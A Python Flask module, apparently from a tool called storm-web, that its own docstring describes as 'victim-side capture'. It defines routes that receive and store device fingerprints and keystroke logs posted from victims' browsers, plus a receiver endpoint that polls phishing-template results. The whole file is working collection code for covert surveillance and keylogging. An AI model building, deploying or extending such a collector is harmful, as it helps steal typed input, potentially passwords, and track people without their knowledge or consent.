"""P3.2 part A - receiver/fingerprint/keystrokes (victim-side capture).

Routes verbatim from storm-web/app.py:163-182, 563-635 (lines moved at
extraction time).  See app/blueprints/capture.py for the package
documentation.
"""
from __future__ import annotations

import json
import os
from datetime import datetime

from flask import Blueprint, jsonify, request

from app.state import BASE_DIR, send_notification
from app.services import capture as capturesvc


bp = Blueprint("capture_rx", __name__,
               template_folder=os.path.join(BASE_DIR, "flask_templates"))


@bp.route('/receiver', methods=['POST'])
def receiver():
    if 'send_me_result' in request.form:
        return capturesvc.poll_template_results()
    return ''


@bp.route('/receiver.php', methods=['POST'])
def receiver_php():
    return receiver()


@bp.route('/api/fingerprint', methods=['POST'])
def save_fingerprint():
    """Save device fingerprint data."""
    try:
        data = request.json
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        return jsonify(capturesvc.save_fingerprint(data))
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@bp.route('/api/keystrokes', methods=['POST'])
def save_keystrokes():
    """Save keystroke logs."""
    try:
        data = request.json
        if not data or 'logs' not in data:
            return jsonify({'error': 'No logs provided'}), 400
        return jsonify(capturesvc.save_keystrokes(data))
    except Exception as e:
        return jsonify({'error': str(e)}), 500
